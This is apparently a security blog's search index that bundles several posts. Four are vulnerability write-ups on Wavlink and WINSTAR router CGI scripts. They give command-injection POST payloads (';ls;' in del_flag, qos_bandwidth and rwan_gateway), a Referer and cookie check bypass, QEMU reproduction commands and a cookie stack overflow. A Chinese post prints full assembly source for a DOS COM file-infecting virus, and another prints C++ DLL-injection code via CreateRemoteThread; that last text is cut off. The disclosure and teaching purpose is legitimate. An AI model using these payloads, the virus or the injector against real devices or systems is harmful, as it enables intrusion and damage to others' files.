<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Remote Command Execution in firewall.cgi of wavlink-WL-WN579A3 Device</title>
    <link href="/2025/03/31/Remote-Command-Execution-in-firewall-cgi-of-wavlink-WL-WN579A3-Device/"/>
    <url>/2025/03/31/Remote-Command-Execution-in-firewall-cgi-of-wavlink-WL-WN579A3-Device/</url>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a><strong>Description</strong>:</h1><p>A command injection vulnerability exists in the  configuration management module’s CGI script (<code>./etc/lighttpd/www/cgi-bin/firewall.cgi</code>). .The system function executes the concatenated byte_418C74. Since byte_418C74 can be controlled, the command execution vulnerability is triggered and any command can be executed.</p><p><img src="/../res/image-20250331200919940.png" alt="image-20250331200919940"></p><h1 id="exploit："><a href="#exploit：" class="headerlink" title="exploit："></a>exploit：</h1><p>entering the main function, first verify the reference and cookie, check the logic and add environment variables to bypass</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-E <span class="hljs-attribute">HTTP_REFERER</span>=wifi.wavlink.com<br>-E HTTP_COOIKE = <span class="hljs-attribute">session</span>=1111111111111<br></code></pre></td></tr></table></figure><p><img src="/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device-1.assets/image-20250331164323669.png" alt="image-20250331164323669"></p><p><img src="/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device-1.assets/image-20250331164356744.png" alt="image-20250331164356744"></p><p>tracking sub_4016F0 function When the user inputs the parameter firewall&#x3D;singlePortForwardDelete, the function sub_4016F0 is entered. In the sub_4016F0 function, the user input parameter del_flag is spliced into v4, and then system(v4) is executed, so we can construct a suitable v4 for attack</p><p><img src="/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device-1.assets/image-20250331201304203.png" alt="image-20250331201304203"></p><p>post_data.txt as follows:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">firewall</span>=singlePortForwardDelete&amp;del_flag=<span class="hljs-comment">;ls;</span><br></code></pre></td></tr></table></figure><p>Executing within a chrooted QEMU environment:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo chroot . ./qemu-mipsel-static -E <span class="hljs-attribute">CONTENT_LENGTH</span>=1111 -cpu 74Kf  -g 1234 -E <span class="hljs-attribute">HTTP_REFERER</span>=wifi.wavlink.com -E  <span class="hljs-attribute">HTTP_COOKIE</span>=session=111111111111111  -L ./lib ./etc/lighttpd/www/cgi-bin/firewall.cgi &lt; post_data.txt<br></code></pre></td></tr></table></figure><p>Debugging confirms execution within <code>system()</code></p><p><img src="/../res/c35d02547e70712d8030433a96bfaa6e.png" alt="img"></p><p>—the resulting command assembled by the application is:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">uci <span class="hljs-keyword">delete</span> firewall.@redirect[;<span class="hljs-keyword">ls</span>; ]<br></code></pre></td></tr></table></figure><p>This command not only executes the intended script (<code>uci delete firewall.@redirect[</code>) but also the injected <code>ls</code> command, which confirms that arbitrary command execution is possible. Given the potential for information disclosure and further system compromise, this issue is critical and should be addressed promptly.</p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remote Command Execution in qos.cgi of wavlink-WL-WN579A3 Device</title>
    <link href="/2025/03/31/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device/"/>
    <url>/2025/03/31/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device/</url>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a><strong>Description</strong>:</h1><p>A command injection vulnerability exists in the  configuration management module’s CGI script (<code>./etc/lighttpd/www/cgi-bin/qos.cgi</code>).The system function executes the concatenated byte_417C84. Since byte_417C84 can be controlled, the command execution vulnerability is triggered and any command can be executed.</p><p><img src="/../res/image-20250331163429148.png" alt="image-20250331163429148"></p><h1 id="exploit："><a href="#exploit：" class="headerlink" title="exploit："></a>exploit：</h1><p>entering the main function, first verify the reference and cookie, check the logic and add environment variables to bypass</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-E <span class="hljs-attribute">HTTP_REFERER</span>=wifi.wavlink.com<br>-E HTTP_COOIKE = <span class="hljs-attribute">session</span>=1111111111111<br></code></pre></td></tr></table></figure><p><img src="/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device.assets/image-20250331164323669.png" alt="image-20250331164323669"></p><p><img src="/../res/image-20250331164356744.png" alt="image-20250331164356744"></p><p>Tracking the sub_402598 function, we found that when the user enters the parameter page&#x3D;qos, the sub_401340 function will be entered.</p><p><img src="/../res/image-20250331163942040.png" alt="image-20250331163942040"></p><p>Continuing the tracking, the program obtains the value of qos_bandwidth from the user input and disassembles it into v12 and v13.</p><p><img src="/../res/image-20250331164606840.png" alt="image-20250331164606840"></p><p><img src="/../res/image-20250331164647013.png" alt="image-20250331164647013"></p><p>Then, v12 and v13 are concatenated to byte_417C84. Therefore, we can control the value of qos_bandwidth to execute the command.</p><p>post_data.txt as follows:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">page</span>=qos&amp;sel_qos=<span class="hljs-number">1</span>&amp;qos_bandwidth=<span class="hljs-comment">;ls;,1</span><br></code></pre></td></tr></table></figure><p>Executing within a chrooted QEMU environment:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo chroot . ./qemu-mipsel-static -E <span class="hljs-attribute">CONTENT_LENGTH</span>=1111 -cpu 74Kf  -g 1234 -E <span class="hljs-attribute">HTTP_REFERER</span>=wifi.wavlink.com -E  <span class="hljs-attribute">HTTP_COOKIE</span>=session=111111111111111  -L ./lib ./etc/lighttpd/www/cgi-bin/qos.cgi &lt; post_data.txt<br></code></pre></td></tr></table></figure><p>Debugging confirms execution within <code>system()</code></p><p><img src="/Remote-Command-Execution-in-qos-cgi-of-wavlink-WL-WN579A3-Device.assets/f395600195f417da54958e98433f3110.png" alt="img"></p><p>—the resulting command assembled by the application is:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qos_script</span>.sh mode_setup <span class="hljs-number">1</span> ; ls; <span class="hljs-number">1</span>&gt;/dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>This command not only executes the intended script (<code>qos_script.sh</code>) but also the injected <code>ls</code> command, which confirms that arbitrary command execution is possible. Given the potential for information disclosure and further system compromise, this issue is critical and should be addressed promptly.</p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remote Command Execution in adm.cgi of wavlink-WL-WN579A3 Device</title>
    <link href="/2025/03/27/Remote-Command-Execution-in-adm-cgi-of-wavlink-WL-WN579A3-Device/"/>
    <url>/2025/03/27/Remote-Command-Execution-in-adm-cgi-of-wavlink-WL-WN579A3-Device/</url>
    
    <content type="html"><![CDATA[<h1 id="Wavlink-WL-WN579A3-introduced"><a href="#Wavlink-WL-WN579A3-introduced" class="headerlink" title="Wavlink-WL-WN579A3 introduced"></a>Wavlink-WL-WN579A3 introduced</h1><p><strong>Wavlink-WL-WN579A3</strong> is engineered to deliver dual-band signal extension and expansive coverage, making it an exceptional solution for homes, offices, and hybrid indoor-outdoor networking environments. Equipped with a built-in high-power amplifier, this high-performance Wi-Fi range extender effortlessly penetrates thick walls and obstacles, ensuring stable connectivity across large areas.</p><p><img src="/../res/image-20250317214843356-17430608159401.png" alt="image-20250317214843356"></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a><strong>Description</strong>:</h1><p>A command injection vulnerability exists in the network configuration management module’s CGI script (<code>./etc/lighttpd/www/cgi-bin/adm.cgi</code>). The flaw is triggered when user-supplied input is concatenated and passed to the <code>system()</code> function via the <code>sub_4018E8</code> routine. This module manages various WAN interface configurations (e.g., DHCP, PPPoE, 4G, PPTP&#x2F;L2TP).</p><h1 id="exploit："><a href="#exploit：" class="headerlink" title="exploit："></a>exploit：</h1><p>The vulnerability occurs at code address <code>0x0040300C</code></p><p><img src="/../res/image-20250327151503899.png" alt="image-20250327151503899"></p><p>with the critical string construction performed at <code>0x00402EA8</code>, where several parameters (such as v112, v67, v79, v111, and v81) are fully user-controlled. </p><p><img src="/../res/image-20250327152002211.png" alt="image-20250327152002211"></p><p><img src="/../res/image-20250327155111167.png" alt="image-20250327155111167"></p><p>Under specific conditions—when the HTTP parameters include:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">page</span>=wan&amp;Wan0T=<span class="hljs-number">5</span>&amp;wan_type_4g=AUTO4G&amp;Second_wan_value=STATIC<br><span class="hljs-attr">HTTP_REFERER</span>=wifi.wavlink.com<br></code></pre></td></tr></table></figure><p>—and the POST data is crafted as follows:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">page</span>=wan<span class="hljs-variable">&amp;Wan0T</span>=5<span class="hljs-variable">&amp;wan_type_4g</span>=AUTO4G<span class="hljs-variable">&amp;Second_wan_value</span>=STATIC<span class="hljs-variable">&amp;ppp_username</span>=admin2860<span class="hljs-variable">&amp;ppp_passwd</span>=0<span class="hljs-variable">&amp;ppp_setver</span>=0<span class="hljs-variable">&amp;Igmp_proxy_value</span>=0<span class="hljs-variable">&amp;rwan_ip</span>=0<span class="hljs-variable">&amp;rwan_mask</span>=0<span class="hljs-variable">&amp;rwan_gateway</span>=0; ls;<br></code></pre></td></tr></table></figure><p>Executing within a chrooted QEMU environment:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static -E CONTENT_LENGTH=1111 -cpu 74Kf  -g 1234 -E HTTP_REFERER=wifi.wavlink.com  -L ./lib ./etc/lighttpd/www/cgi-bin/adm.cgi &lt; post_data.txt<br><br></code></pre></td></tr></table></figure><p>Debugging confirms execution within <code>system()</code></p><p><img src="/../res/image-20250327152720056.png" alt="image-20250327152720056"></p><p>—the resulting command assembled by the application is:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dual_wan</span>.sh pptp admin2860 <span class="hljs-number">0</span> <span class="hljs-number">0</span> static <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>; ls; <span class="hljs-number">1</span>&gt;/dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>This command not only executes the intended script (<code>dual_wan.sh</code>) but also the injected <code>ls</code> command, which confirms that arbitrary command execution is possible. Given the potential for information disclosure and further system compromise, this issue is critical and should be addressed promptly.</p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device</title>
    <link href="/2025/03/17/Buffer%20Overflow%20in%20upload.cgi%20of%20WINSTAR_WN572HP3%20Device/"/>
    <url>/2025/03/17/Buffer%20Overflow%20in%20upload.cgi%20of%20WINSTAR_WN572HP3%20Device/</url>
    
    <content type="html"><![CDATA[<h1 id="WINSTAR-WN572HP3-introduced"><a href="#WINSTAR-WN572HP3-introduced" class="headerlink" title="WINSTAR_WN572HP3 introduced"></a>WINSTAR_WN572HP3 introduced</h1><p>WN572HP3 is designed for WISP CPE and long distance wireless network, making it an ideal solution for small business offices and the home with outdoor networking requirements. This High power outdoor Wi-Fi range extender is specifically designed to provide an effective solution for outdoor wireless networking applications. With its centralized management platform and high degree of flexibility, it is the ideal choice for providing point-to-point, point-to-multipoint, and outdoor Wi-Fi coverage.</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a><strong>Description</strong>:</h1><p>A buffer overflow vulnerability exists in the Lighttpd web service component of the WINSTAR_WN572HP3 device, specifically within the <code>/etc/lighttpd/www/cgi-bin/upload.cgi</code> file. The vulnerability occurs when processing HTTP requests due to the insecure use of the <code>strcpy</code> function to copy untrusted data from the <code>HTTP_COOKIE</code> environment variable (retrieved via <code>getenv(&quot;HTTP_COOKIE&quot;)</code>) into a fixed-size stack buffer without proper bounds checking. An attacker can exploit this by crafting a malicious HTTP request with an excessively long Cookie value, leading to stack overflow. This may overwrite critical memory structures (e.g., return addresses), resulting in arbitrary code execution or denial of service (DoS).</p><h1 id="exploit："><a href="#exploit：" class="headerlink" title="exploit："></a>exploit：</h1><p>use of the <code>strcpy</code> function to copy untrusted data from the <code>HTTP_COOKIE</code> environment variable (retrieved via <code>getenv(&quot;HTTP_COOKIE&quot;)</code>) into a fixed-size stack buffer without proper bounds checking. </p><p><img src="/../res/image-20250317214211270.png" alt="image-20250317214211270"></p><p>Simulations were performed using the QUME</p><p><img src="/../res/image-20250317214843356.png" alt="image-20250317214843356"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chroot . .<span class="hljs-regexp">/qemu-mipsel-static -gspan>etc<span class="hljs-regexp">/lighttpd/</span>www<span class="hljs-regexp">/cgi-bin/u</span>pload.cgi<br></code></pre></td></tr></table></figure><p>The requested stack space is 0x178 overflow to 0x1e9</p><p><img src="/../res/image-20250317215653742.png" alt="image-20250317215653742"></p><p><img src="/../res/image-20250317215602707.png" alt="image-20250317215602707"></p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件型病毒</title>
    <link href="/2024/11/05/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/"/>
    <url>/2024/11/05/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/</url>
    
    <content type="html"><![CDATA[<h2 id="dos可执行文件病毒"><a href="#dos可执行文件病毒" class="headerlink" title="dos可执行文件病毒"></a>dos可执行文件病毒</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="绝对映像"><a href="#绝对映像" class="headerlink" title="绝对映像"></a>绝对映像</h4><p>dos操作系统通过将可执行文件直接复制到内存中来加载可执行文件，不进行重定位。</p><h4 id="dos程序起点"><a href="#dos程序起点" class="headerlink" title="dos程序起点"></a>dos程序起点</h4><p>dos操作系统规定了程序起点偏移位100H。通过在源代码的开头加入（org 100H）来指定代码的起始偏移位100H</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将病毒代码插入可执行文件的末尾，通过劫持程序执行流，使得程序开始后先执行病毒程序，之后再执行原本的程序。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs asm">CSEG SEGMENT <br>ASSUME CS:CSEG,DS:CSEG,SS:CSEG <br>main PROC NEAR <br>mainstart: <br>CALL vstart ;病毒的代码开始处 <br>vstart: <br>POP SI ;得到当前地址 <br>MOV BP,SI ;保存当前地址 <br>PUSH SI <br>MOV AH,9 <br>ADD SI,OFFSET message-OFFSET vstart ;显示预设字符串 <br>MOV DX,SI <br>INT 21h <br>POP SI <br>ADD SI,OFFSET yuan4byte-OFFSET vstart ;取得原程序中的前四个字节 <br>MOV DI,100h ;目的地址 <br>MOV AX,DS:[SI] ;开始复制 <br>MOV DS:[DI],AX <br>INC SI <br>INC SI <br>INC DI <br>INC DI <br>MOV AX,DS:[SI] <br>MOV DS:[DI],AX <br>MOV SI,BP ;恢复地址值 <br>MOV DX,OFFSET delname-OFFSET vstart <br>ADD DX,SI <br>MOV AH,41h <br>INT 21h <br>MOV DX,OFFSET filename-OFFSET vstart ;得到文件名 <br>ADD DX,SI <br>MOV AL,02 <br>MOV AH,3dh ;写文件 <br>INT 21h <br>JC error <br> <br>MOV AX,4202h ;到文件尾 <br>XOR CX,CX <br>XOR DX,DX <br>INT 21h <br>MOV DI,OFFSET new4byte-OFFSET vstart ;保存要跳的地方 <br>ADD DI,2 <br>ADD DI,SI <br>SUB AX,4 //?<br>MOV DS:[DI],AX <br>ADD SI,OFFSET mainstart-OFFSET vstart ;准备写入病毒 <br>MOV DX,SI <br>MOV vsizes,OFFSET vends-OFFSET mainstart <br>MOV CX,vsizes <br>MOV AH,40h <br>INT 21h <br>MOV SI,BP ;定位到文件头 <br>MOV AL,0 <br>XOR CX,CX <br>XOR DX,DX <br>MOV AH,42h <br>INT 21h <br>MOV AH,40h ;将新的文件头写入 <br>MOV CX,4 <br>MOV DX,OFFSET new4byte-OFFSET vstart <br>ADD DX,SI <br>INT 21h <br>MOV AH,3eh ;关闭文件 <br>INT 21h <br>error: <br>MOV AX,100h <br>PUSH AX <br>RET <br>main ENDP <br>yuan4byte: <br>RET ;占位符<br>DB 3 DUP (?) <br>vsizes DW 0 <br>new4byte DB &#x27;M&#x27;,0e9h,0,0 <br>filename DB &quot;test.com&quot;,0 <br>delname DB &quot;del.txt&quot;,0 <br>message DB &quot;You are infected by a simple com virus~~&quot; <br>DB 0dh,0ah,&quot;$&quot; <br>vends: <br>start: <br>MOV AX,CSEG <br>MOV DS,AX <br>MOV SS,AX <br>CALL main <br>MOV AX,4c00h <br>INT 21h <br>CSEG ENDS <br>END start<br><br></code></pre></td></tr></table></figure><p>关键代码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV AX,4202h ;到文件尾 <br>XOR CX,CX <br>XOR DX,DX <br>INT 21h <br>MOV DI,OFFSET new4byte-OFFSET vstart ;保存要跳的地方 <br>ADD DI,2 <br>ADD DI,SI <br>SUB AX,4 //?<br>MOV DS:[DI],AX <br></code></pre></td></tr></table></figure><p>这段代码是用来计算要跳转的位置，并且存储（这里的跳转不懂为什么要到末尾向前移动四个字节）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV AH,40h ;将新的文件头写入 <br>MOV CX,4 <br>MOV DX,OFFSET new4byte-OFFSET vstart <br>ADD DX,SI <br>INT 21h <br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">AH = 40h的功能<br>DS:<span class="hljs-attribute">DX</span>=数据缓冲区地址<br><span class="hljs-attribute">BX</span>=文件代号<br><span class="hljs-attribute">CX</span>=写入的字节数<br></code></pre></td></tr></table></figure><p>这段代码向文件写入新的文件头 new4byte DB ‘M’,0e9h,0,0 后两个字节为跳转的地址，其中e9为jmp指令的机器码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">ADD SI,OFFSET mainstart-OFFSET vstart ;准备写入病毒 <br>MOV DX,SI <br>MOV vsizes,OFFSET vends-OFFSET mainstart <br>MOV CX,vsizes <br>MOV AH,40h <br>INT 21h <br></code></pre></td></tr></table></figure><p>写入病毒</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92.assets/image-20241106141104914.png" alt="image-20241106141104914"></p><p>可以看到修改后的文件头为 e9  <strong>032fh</strong>,程序在打开后会跳转到032fh的位置</p><p><img src="/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92.assets/image-20241106141252379.png" alt="image-20241106141252379"></p><p>可以看到032f向后四个字节就是病毒代码的开始</p><h2 id="win32可执行文件病毒"><a href="#win32可执行文件病毒" class="headerlink" title="win32可执行文件病毒"></a>win32可执行文件病毒</h2><h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2>]]></content>
    
    
    <categories>
      
      <category>计算机病毒</category>
      
    </categories>
    
    
    <tags>
      
      <tag>病毒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll注入</title>
    <link href="/2024/06/24/dll%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/06/24/dll%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h1><p>DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能</p><p>DLL的实现方法</p><ul><li>创建远程线程(CreateRemoteThread)</li><li>使用注册表(AppInit_Dlls)</li><li>消息勾取(SetWindowsHookEx() API)</li></ul><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h2><p>主程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// InjectDll.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//确定路径需要占用的缓冲区大小</span><br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <br>    <span class="hljs-keyword">if</span> (!(hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <br>    pRemoteBuf = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    <br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    <br>    hMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>   <br>    hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>   <br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// inject dll</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]))<br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>DLL download index.html </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 